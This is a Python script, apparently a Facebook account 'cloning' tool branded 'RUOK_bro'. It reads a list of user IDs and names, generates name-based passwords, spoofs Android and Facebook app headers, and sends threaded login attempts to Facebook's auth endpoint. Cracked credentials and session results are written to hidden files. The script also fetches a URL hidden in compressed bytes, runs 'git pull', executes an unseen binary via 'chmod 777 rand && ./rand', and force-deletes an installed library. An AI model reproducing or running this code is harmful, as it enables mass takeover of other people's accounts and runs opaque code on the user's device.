import os,sys,time,platform
rrq=("requests");mm=("uninstall")
from tqdm import tqdm

def load():
     for i in tqdm(range(100)):
           time.sleep(0.0099)
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")
    else:os.system('clear')
print('mGetting Updates...!')
load();time.sleep(2);clear()
print('mInstalling Updates...!')
try:
    os.system(f"pip {mm} {rrq} -y &&  rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests")
except requests.exceptions.ConnectionError:
    print("Net Error");exit()
try:
    import requests
except ImportError:
    os.system(f'pip install {rrq}')
    os.system('pip install pycryptodome,mecanize,bs4')

import requests
import uuid
from os import system as s
import os,sys,time,json,random,re,string,platform,base64,uuid,zlib,subprocess
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from urllib import request as req
from zlib import decompress as dec
from requests.exceptions import ConnectionError
session=requests.Session()
debug = False
os.system("git pull")
os.system('clear')
loop = 0
ok=0
cp=0
oks = []
cps = []
id=[]
twf=[]
ugen=[]
ugen2=[]
ugent = []
methods=[]
android_models=[]

sos = zlib.decompress(b'x\x9c\x05\xc1K\x0e\x80 \x0c\x05\xc0\x13I]\xb0r\xeb\xde;\x14\xd2`C\xf8\xa4}D\xbd\xbd370\xfd 2~BQ\xdc+-\x17\xcb\xa3C:B\x1e\x8d.\xad\x1a\xf7\xb8\x9d_\x12\xa3\xc9\xb9r\x11\xa7\xc6\xda\xc9a\xda\x8b\x07\xbc\xf8\x01\xf4V\x1bk')

try:
    xx = requests.get(sos).text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass


#------------------[ SUBPROCESS ]-------------------#
for z in range(2000):
    versi_android = str(random.randint(4,12))+".0.0"
    device = random.choice(["Nexus 5 Build/NHG47L","Nexus 7 Build/LMY47V","Nexus 5X Build/N4F26T","Nexus 6P Build/OPM5.171019.014","Nexus 5X Build/OPR6.170623.023","Nexus 6 Build/OPM5.171019.015","Nexus 5X Build/MMB29K","Nexus 5X Build/OPM6.171019.030.H1"])
    versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    ua = f"Mozilla/5.0 (Linux; Android {versi_android}; {device}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
    ugen.append(ua)
for xd in range(5000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)


    a='Mozilla/5.0 (Linux; Android 6.0.1;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/533.1'
    uaku=(f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku)
#----------[ DEL_CUO ]---------#
def __UBI___():
    and_vers = random.randint(4,12)
    and_mod = random.choice(android_models)
    and_id = str(random.randint(9,99))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(9,99))
    app_uld = str(random.randint(111111, 999999))+'.'+str(random.randint(111,999))
    app_ver = str(random.randint(99,999))+'.'+str(random.randint(99,999))+'.'+str(random.randrange(99,999))+'.'+str(random.randint(99,999))+'.'+str(random.randint(99,999))
    app_vercode = str(random.randint(000000000,999999999))
    pkg_name = random.choice(('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana'))

    ua =f'Mozilla/5.0 (Linux; Android 11; SM-M307FN Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36 GNews Android/2022131834'
    return ua


W = "\033[1;97m"
D = "\033[1;92m"
G = "\033[1;32m"
R = "\033[1;31m"
H = '\033[1;30m' 
Y = '\033[1;33m'
Q = '\033[1;37m'
T = '\033[1;34m'


def __banner___():
    os.system('clear')
    print(f'{D}╭───────────────────────────────────────────────────╮')
    print(f'│{Y} ██████  ██    ██  ██████  ██   ██  {R}   {D}│')
    print(f'│{Y} ██   ██ ██    ██ ██    ██ ██  ██   {R} Shahzaib Ali {D}│')
    print(f'│{Y} ██████  ██    ██ ██    ██ █████    {R} WhatsApp {D}│')
    print(f'│{Y} ██   ██ ██    ██ ██    ██ ██  ██   {R} +9232462258722 {D}│')
    print(f'│{Y} ██   ██  ██████   ██████  ██   ██  {R}   {D}│')
    print(f'├── RUOK_bro version 0.1─┤')
def linex():
    print("├───────────────────────────────────────────────────╯")
def __main__():
    __banner___()
    print(f"{D}├[{R}𝙰{D}] {Y}𝗥𝗔𝗡𝗗𝗢𝗠 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗠𝗘𝗡𝗨                            {D}│")
    print(f"{D}├[{R}𝙱{D}] {Y}𝗙𝗜𝗟𝗘 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗠𝗘𝗡𝗨                              {D}│")
    print(f"{D}├[{R}𝙲{D}] {Y}𝗙𝗜𝗟𝗘 𝗗𝗨𝗠𝗣𝗘𝗥                                    {D}│")
    print(f"{D}├[{R}𝙳{D}] {Y}CONTACT ADMIN                                  {D}│");linex()
    inputt = input(f"├──┤{D}[{G}{D}]{G} CHOISE :{D} ")
    if inputt in ["a","A"]:
        os.system("chmod 777 rand && ./rand")
    elif inputt in ["b","B"]:
        __File___()
    elif inputt in ["c","C"]:
        print('Fux')
    elif inputt in ["r","R"]:
        print('Developer Unavailable :)')
    else:
        __main__()
def __File___():
    global oks,cps,twf
    dfile = input(f'{D}├──┤[{G}{D}]{G} File path :{D} ')
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{D}├──┤[{R}✘{D}] {R}File Not Found...')
        time.sleep(1)
        __File___()
    dplist = []
    try:
        print(f'├───────────────────────────────────────────────────')
        pass_lmit = int(input(f'{D}├──┤[{Y}{D}]{Y} Pass Limit :{D} '))
    except:
        pass_lmit =1
    for i in range(pass_lmit):
        dplist.append(input(f'{D}├──┤[{G}{D}]{G} Password no.{i+1} : {D}'))
    with ThreadPool(max_workers=30) as riki:
        total_ids = str(len(dx))
        print(f'{D}├───────────────────────────────────────────────────')
        print(f'{D}├[{G}{D}]{R} TOTAL IDS : {G}'+total_ids)
        print(f'{D}├[{G}{D}]{Y} USE {G}✈︎ {Y}ON/OFF IF NO RESULT')
        print(f"{D}├───────────────────────────────────────────────────")
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            riki.submit(rikim2,ids,names,passlist,total_ids)
    print(f'{D}├───────────────────────────────────────────────────')
    print(f'{D}├[{G}✓{D}] {G}The process has completed')
    print(f'{D}├[{G}✓{D}] {G}Total OK : '+str(len(oks)))
    print(f'{D}├───────────────────────────────────────────────────')
    input(f'╰──────┤[] Press enter to back ')
    __File___()
def convert(cookie):
        coki2 = ('datr=%s;sb=%s;c_user=%s;xs=%s;fr=%s'%(cookie['datr'],cookie['sb'],cookie['c_user'],cookie['xs'],cookie['fr']))
def rikim2(ids,names,passlist,total_ids):
    global loop,oks,cps,twf
    bo=random.choice([G,R,Y,T,H])
    sys.stdout.write(f'\r{Q}⁂[{G}ROUK{Q}]⁂{bo}{loop}{Q}⁂{D}LIVE:{G}{len(oks)}{Q}');sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            
            data={

                    'adid': str(uuid.uuid4()),

                    'format': 'json',

                    'device_id': str(uuid.uuid4()),

                    'cpl': 'true',

                    'family_device_id': str(uuid.uuid4()),

                    'credentials_type': 'device_based_login_password',

                    'error_detail_type': 'button_with_disabled',

                    'source': 'device_based_login',

                    'email': ids, 

                    'password': pas,

                    'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',

                    'generate_session_cookies': '1',

                    'meta_inf_fbmeta': '',

                    'advertiser_id': str(uuid.uuid4()),

                    'currently_logged_in_userid': '0',

                    'locale': 'en_GB',

                    'client_country_code': 'GB',

                    'method': 'auth.login',

                    'fb_api_req_friendly_name': 'authenticate',

                    'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',

                    'api_key': '882a8490361da98702bf97a021ddc14d'

            }

            head={

                    'User-Agent': __UBI___(),

                    'Accept-Encoding': 'gzip, deflate',

                    'Accept': '*/*',

                    'Connection': 'keep-alive',

                    'Content-Type': 'application/x-www-form-urlencoded',

                    'Host': 'graph.facebook.com',

                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),

                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),

                    'X-FB-Connection-Type': 'MOBILE.LTE',

                    'X-Tigon-Is-Retry': 'False',

                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',

                    'x-fb-device-group': '5120',

                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',

                    'X-FB-Request-Analytics-Tags': 'graphservice',

                    'X-FB-HTTP-Engine': 'Liger',

                    'X-FB-Client-IP': 'True',

                    'X-FB-Server-Cluster': 'True',

                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'

            }
            po = requests.post('https://'+'b-gr'+'ap'+'h'+'.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                coki = po["session_cookies"]
                cok = {}
                for x in coki:
                    cok.update({x["name"]:x["value"]})
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r{D}├[{G}✓{D}] {D}[{G}ROUK-OK{D}] '+ids+' | '+pas+'')
                oks.append(ids)
                open('.OK.txt','a').write(ids+' | '+pas+'\n')
                break
            elif 'two_factor' in str(po):
                print(' [2FA] '+ids+' | '+pas+'')
                twf.append(ids)
                open('.2F.txt','a').write(ids+' | '+pas+'\n')
                break
            elif 'temporarily unavailable' in str(po):
                print('\r\r\x1b[38;5;208m [CP] '+ids+' | '+pas+'\033[1;97m')
                cps.append(ids)
                open('.CP.txt','a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
    except Exception as e:
        pass



__main__()

